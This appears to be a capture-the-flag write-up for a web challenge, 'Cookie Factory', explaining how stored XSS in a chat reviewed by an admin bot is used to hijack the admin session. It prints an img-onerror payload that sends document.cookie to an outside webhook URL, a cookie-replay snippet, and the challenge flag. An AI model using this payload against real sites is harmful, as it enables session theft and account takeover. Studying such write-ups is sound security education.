
# 🧁 Cookie Factory - CTF Writeup

## Challenge Info
- **Name:** Cookie Factory
- **Category:** Web Exploitation

---

## 📝 Challenge Description
> Welcome to the Cookie Factory!
> Here, every visitor gets their very own cookie. Some are sweeter than others.
> You can chat with our friendly admin, who loves reviewing your creative messages.
> Legend says... there’s a *special* cookie you’d want to get your hands on.

**Goal:**
Steal the admin's session cookie and use it to access their dashboard to retrieve the flag.

---

## 🔎 Recon & Source Analysis
Visiting the site reveals:
- A simple **Register/Login** system.
- A **Dashboard with Chat Room** after login.
- A **Changelog page** with flavor text.
- Regular users can send messages to the chatroom.
- Admin has a special flag in their dashboard.

Through casual testing:
- Messages are reflected back verbatim in the chatbox.
- HTML tags like `<b>` or `<img>` are rendered.
- However, `<script>` tags appear ignored (likely parsed inside a `<p>`).

Checking cookies:
- **Session cookie is not HttpOnly.**
- Browser devtools show: `session=...` accessible via `document.cookie`.

---

## 💡 Vulnerability Hypothesis
Given the description and behavior:
- **Persistent XSS** is possible through message injection.
- **Admin bot refreshes the dashboard to read new messages.**
- If malicious scripts can be executed in admin's context, session hijacking is viable.
- Since **HttpOnly is false**, JS can exfiltrate admin's session cookie.

---

## 🛠️ Exploit Strategy
1. **Bypass ineffective `<script>` injection:**
   - Injecting `<script>` blocks won’t execute due to the way messages are embedded into the DOM.
   - However, attribute-based XSS vectors (`<img src=x onerror=...>`) are promising.

2. **Craft a payload to steal admin's cookie:**
   ```html
   <img src=x onerror="fetch('http://webhook.site/abc123?c='+document.cookie)">
   ```
   - Leverages a broken image triggering `onerror`.
   - The malicious JS fetches the admin's `document.cookie` and exfiltrates it to RequestBin.

3. **Admin bot behavior:**
   - The bot will load the dashboard and render the message.
   - The XSS triggers in **admin's browser context**.
   - The stolen cookie is sent to the attacker's endpoint.

---

## 🎯 Execution
1. Register as a normal user.
2. Submit the crafted payload via chat.
3. Observe RequestBin (or equivalent webhook service).
4. Receive admin's session cookie.
5. Manually set your browser's `document.cookie` to admin's session:
   ```javascript
   document.cookie = "session=admin-session-value";
   location.reload();
   ```
6. Upon refreshing, you'll be authenticated as admin.

---

## 🎉 Getting the Flag
After hijacking admin's session:
- Visit `/dashboard`.
- The admin-only flag becomes visible:
  ```
  pecan{d3l1c10u5_c00k135_55bMgl9j5BIl}
  ```

---

## 🧠 Root Cause Analysis
| Cause | Explanation |
|--------|-------------|
| **HttpOnly misconfiguration** | Allowed JS-accessible session cookies |
| **Lack of output sanitization/escaping** | Enabled persistent XSS via attribute injection |

---

